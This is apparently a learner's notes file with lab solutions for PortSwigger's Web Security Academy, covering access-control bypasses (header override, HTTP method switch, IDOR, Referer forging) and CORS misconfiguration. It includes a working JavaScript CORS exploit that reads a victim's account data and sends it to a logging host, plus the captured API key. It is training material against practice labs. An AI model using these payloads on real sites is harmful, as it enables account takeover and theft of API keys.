# Portswigger's Web Security Academy

Notes and ```lab``` solutions/hints.

⭐ Read the actual solutions (upsolve).

## Access Control

- **Authentication** identifies the user and confirms that they are who they say they are.
- **Session management** identifies which subsequent HTTP requests are being made by that same user.
- **Access control** determines whether the user is allowed to carry out the action that they are attempting to perform.

### User's perspective:

1. Vertical access controls
2. Horizontal access controls
3. Context-dependent access controls

### Parameter-based access control methods: hidden field, cookie, preset query string

```
[Lab]: Unprotected admin functionality: robots.txt
[Lab]: Unprotected admin functionality with unpredictable URL: view source => js to check admin => /admin-uhsegl
[Lab]: User role controlled by request paramter: login as wiener/peter => go to /admin
[Lab]: User role can be modified in user profile: 
```

### Platform misconfiguration:
- Restricting certain URLs
- Restricting certain HTTP methods
- *Custom http headers to override restricted urls*

#### [Lab]: URL-based access control can be circumvented
```
POST / HTTP/1.1
Cookie: session=FQxqrQ8PJHEBARHT7se4bxv6sqHGrQJD
X-Original-URL: /admin
```

#### [Lab]: Method-based access control can be circumvented
```
Login as wiener/peter:
PUT /admin-roles HTTP/1.1
Cookie: session=UdlpEENsbTjmMhi15gFrGZLzPJlprpTK
username=wiener&action=upgrade
```

### Horizontal Privilege Escalation
#### [Lab]: User ID controlled by request parameter
```
Login as wiener/peter:
/my-account?id=carlos

Copy and submit the API key
```

#### [Lab]: User ID controlled by request parameter, with unpredictable user IDs 
```
Login as wiener/peter:
Go to /post?postId=3, to find carlos' userId.
User that userId to get API key from My Account page.
```

#### [Lab]: User ID controlled by request parameter with data leakage in redirect
```
Login as wiener/peter
Go to /my-account?id=carlos => it redirects back to home page
Go to /my-account?id=carlos and intercept the response in Burp
Before redirection, the API key for carlos is leaked.
```

### Horizontal to vertical privilege escalation

#### [Lab]: User ID controlled by request parameter with password disclosure
```
Login as wiener/peter
Go to /my-account?user=administrator
Change input type of password to text
Login as administrator/xj6efi
Delete carlos
```

### Insecure direct object references

When an application uses user-supplied input to access objects directly.

```https://insecure-website.com/customer_account?customer_number=132355```

IDOR vulnerabilities often arise when sensitive resources are located in static files on the server-side filesystem. 

``` https://insecure-website.com/static/12144.txt```

#### [Lab]: Insecure Direct Object References
```
Login as wiener/peter
Go to /chat and Download Transcript
Intercept request in Burp to see that transcript is being downloaded from /download-transcript/2.txt
Go to /download-transcript/1.txt
Get carlos' password: qahe69
Login to carlos' account
```

### Access control vulnerabilities in multi-step processes
#### [Lab]: Multi-step process with no access control on one step
```

Login as adminstrator/admin
Observe request for upgrading a user:

POST /admin-roles HTTP/1.1
action=upgrade&confirmed=true&username=wiener

Repeat the request while logged in as wiener
```

### Referer-based access control
#### [Lab]: Referer-based access control

```
Login as administrator/admin
Go to /admin
Upgrade a user and intercept the request in Burp

GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
Referer: https://ace91fd81fbaa096804b8c630061001c.web-security-academy.net/admin

Login as wiener/peter and send the request.
```

### Location-based access control

Circumvented using web proxies, VPNs, or manipulation of client-side geolocation mechanisms.

-----

## Cross Origin Resource Sharing (CORS)

- Browser mechanism for controlled access of resources outside given domain.
- Extends and adds functionality to Same Origin Policy (SOP).
- If a website's CORS policy is poorly configured => cross-domain attacks.
- CORS does not provide protection against cross-site request forgery (CSRF).

### Same Origin Policy

- Aims to prevent websites from attacking each other.
- An origin consists of a URI scheme, domain and port number.
- Without the same-origin policy, if you visited a malicious website it could send requests to other websites (Facebook, Gmail) whose cookies are already present in the browser.
- SOP allows embedding of images via the ```<img>``` tag, media via the ```<video>``` tag and JavaScript includes with the ```<script>``` tag.
- Any JavaScript on the page won't be able to read the contents of the above resources. 
- SOP more relaxed when dealing with cookies, can be accessible from subdomains.
- Possible to relax same-origin policy using document.domain.

### Relaxation in SOP
- CORS protocol uses HTTP headers to define trusted web origin and authentication access.
- These are combined in a header exchange between a browser and the cross-origin web site that it is trying to access.

### Access-Control-Allow-Origin response header

** ```normal-website.com``` sends the following cross-origin request: **

```
GET /data HTTP/1.1
Host: robust-website.com
Origin : https://normal-website.com 
```

** ```robust-website.com``` replies with: **

```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://normal-website.com 
```

**The browser will allow code running on ```normal-website.com``` to access the response because the origins match.**

- No browser supports multiple origins and there are restrictions on the use of the wildcard *.
- Maintaining a list of allowed domains requires ongoing effort, and any mistakes risk breaking functionality.
- So some applications take the easy route of effectively allowing access from any other domain.

```
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=... 
```

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...
```

#### [Lab]: CORS vulnerability with basic origin reflection

1. Login as wiener/peter
2. Go to /my-account
3. /my-account?id=admin is blocked


```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Cookie: session=RP4LxEeQbjJvfMad0sA9P4ECWmB3r99S


Access-Control-Allow-Origin: https://acf41fe01f16167180030e2a00fd001d.web-security-academy.net
Access-Control-Allow-Credentials: true
```

Go to exploit server:
```
<script>

	var req = new XMLHttpRequest();
	req.onload = reqListener;
	req.open('get','https://acf41fe01f16167180030e2a00fd001d.web-security-academy.net/accountDetails',true);
	req.withCredentials = true;
	req.send();

	function reqListener() {
		location='//ac401f581f15167f809a0e1701320092.web-security-academy.net/log?key='+this.responseText;
	};

</script>
```

Submit exploit to victim and go to /log:
```
192.168.1.12    2020-02-05 19:14:00 +0000 "GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22hvhwIMzFHlIEZpEPGhdJ9EAzV06nOMmw%22} HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 PSAcademy/661765"
```

### Errors parsing Origin headers

...
